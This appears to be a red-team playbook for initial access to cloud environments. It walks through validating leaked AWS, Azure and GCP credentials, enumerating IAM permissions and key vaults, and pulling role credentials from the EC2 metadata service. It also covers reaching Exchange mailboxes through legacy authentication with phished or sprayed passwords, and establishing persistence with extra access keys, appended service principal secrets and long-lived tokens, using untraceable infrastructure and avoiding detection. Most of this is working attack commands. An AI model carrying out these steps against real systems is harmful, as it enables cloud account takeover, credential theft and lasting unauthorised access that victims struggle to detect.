# Playbook: Cloud initial access

This playbook covers the full chain from passive cloud surface discovery through to established access
inside a cloud environment. It connects the individual runbooks into an operational sequence and describes
the decision points that determine which path to take.

## Objective

Obtain authenticated access to the target's cloud environment: a valid AWS credential set, an authenticated
Azure session, control of a GCP service account, or a token for a SaaS platform with meaningful access.

## Prerequisites

- Target organisation name and primary domain.
- Completed surface discovery from the passive recon note.
- Results from at least one of the provider-specific runbooks.
- Authorised scope that includes the cloud environment.
- A clean operating environment for credential use: a VPS or cloud instance that is not traceable
  to your organisation or prior engagements.

## Phase 1: Surface triage

Review the output of the passive recon and runbooks. Rank the findings by exploitability:

1. Credentials or tokens found in public repositories: these are immediately actionable if still valid.
2. Publicly accessible storage with sensitive content: configuration files, credential files, or
   database dumps found in phase 3 of the storage runbooks may contain cloud credentials.
3. User accounts confirmed via enumeration: these become targets for password spraying or phishing.
4. Misconfigured storage with write access: less immediately useful for initial access but worth
   documenting and potentially useful for staging.
5. Identity provider configuration revealing weak controls: legacy authentication enabled, user
   consent permitted for OAuth, or MFA not enforced for all accounts.

Proceed with the highest-confidence finding. Do not pursue multiple paths simultaneously if it can
be avoided: parallel activity increases detection risk.

## Phase 2: Credential validation

If credentials or tokens were found in public repositories, validate them before doing anything else.

For AWS access keys:

```bash
aws sts get-caller-identity \
  --access-key-id AKIAIOSFODNN7EXAMPLE \
  --secret-access-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

A successful response confirms the key is valid and returns the account ID, user ID, and ARN. Do not
proceed to enumerate permissions until you have confirmed the engagement scope covers this account.

For Azure tokens or credentials, verify with a minimal permission call:

```bash
az login --username user@target.com --password PASSWORD
az account show
```

For GCP service account keys:

```bash
gcloud auth activate-service-account --key-file=key.json
gcloud auth print-access-token
```

For SaaS API tokens, make a read-only API call to the service's current user or account endpoint.

## Phase 3A: Access via exposed credentials

If credentials are valid, enumerate what they can access before taking any action that changes state.

### AWS

Enumerate attached policies and what they permit:

```bash
# Who am I?
aws sts get-caller-identity

# What policies does this identity have?
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-user-policies --user-name USERNAME
aws iam get-user-policy --user-name USERNAME --policy-name POLICY

# What groups is the user in, and what do those groups permit?
aws iam list-groups-for-user --user-name USERNAME

# Enumerate S3 buckets visible to this identity
aws s3 ls

# Enumerate EC2 instances
aws ec2 describe-instances --region eu-west-1

# Check for instance metadata service access on any EC2 instances
# (if you already have code execution on an EC2 instance)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Azure

After authenticating, enumerate what the account can see:

```bash
# List subscriptions
az account list

# List resource groups
az group list

# List key vaults (high value)
az keyvault list

# List storage accounts
az storage account list

# Check role assignments for the current identity
az role assignment list --assignee USER-OBJECT-ID
```

## Phase 3B: Access via storage content

If sensitive content was found in publicly accessible storage, review it for credentials that grant
access to the cloud environment itself.

Common credential-bearing file types:

- `.env` files: contain environment variables including cloud provider credentials
- `terraform.tfstate`: Terraform state files contain resource identifiers, and sometimes credentials
  stored as resource attributes
- `credentials` files (AWS): the standard AWS credential file format
- `key.json` files (GCP): service account key files
- `*.pem`, `*.key`: private keys for certificates or SSH
- CI/CD configuration files: `.travis.yml`, `.github/workflows/`, `Jenkinsfile`: may contain
  secrets as plaintext or reference secret management that reveals the secret names

## Phase 3C: Access via identity compromise

If surface discovery produced confirmed user accounts and the authentication control assessment revealed
exploitable weaknesses, pursue credential-based access.

Legacy authentication (Microsoft 365 only): if Basic Auth is enabled against Exchange Web Services or
IMAP, a credential obtained through phishing or password spraying grants access without MFA:

```bash
curl -s --user "user@target.com:PASSWORD" \
  "https://outlook.office365.com/EWS/Exchange.asmx" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="utf-8"?>
  <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
      <GetFolder xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">
        <FolderShape><BaseShape>Default</BaseShape></FolderShape>
        <FolderIds><DistinguishedFolderId Id="inbox"/></FolderIds>
      </GetFolder>
    </soap:Body>
  </soap:Envelope>'
```

For accounts without legacy authentication and with MFA, credential-based initial access requires
a phishing or AiTM approach. See the AiTM phishing runbook in the social engineering section.

## Phase 4: Establish persistence

Once access is obtained, establish a secondary persistence mechanism before taking any further action.
The initial credential may be rotated, revoked, or monitored.

### AWS

Create a secondary access key for the compromised user, or create a new IAM user if permissions permit:

```bash
aws iam create-access-key --user-name USERNAME
```

If the role permits assuming other roles, enumerate what is assumable:

```bash
aws iam list-roles | grep AssumeRolePolicyDocument
```

### Azure

Register a new credential (certificate or secret) on an existing application or service principal
with the compromised account:

```bash
az ad app credential reset --id APPLICATION-ID --append
```

Or add the compromised account to a group with elevated permissions if group management is permitted.

### SaaS platforms

Generate a long-lived API token or OAuth refresh token that does not expire with the user's session.
Where possible, use an integration-based token rather than a user session token, as integrations are
reviewed less frequently and are not invalidated by password changes.

## Phase 5: Evidence collection

Capture the following for the engagement report:

- Screenshot or terminal output of the initial credential validation.
- Screenshot or output of the initial enumeration showing what the identity has access to.
- The source where the initial credentials or access was found.
- Any persistence mechanism created, including how to revoke it at the end of the engagement.
- Timeline of all actions taken with timestamps.

## Techniques

- [Cloud surface discovery](../notes/recon.md)
- [S3 and object storage discovery](../runbooks/s3-discovery.md)
- [Azure AD tenant enumeration](../runbooks/azure-tenant.md)
- [GCP project and bucket enumeration](../runbooks/gcp.md)
- [SaaS integration mapping](../runbooks/saas-mapping.md)
- [Misconfigurations](../notes/misconfigurations.md)
- [Account and privilege attacks](../notes/accounts.md)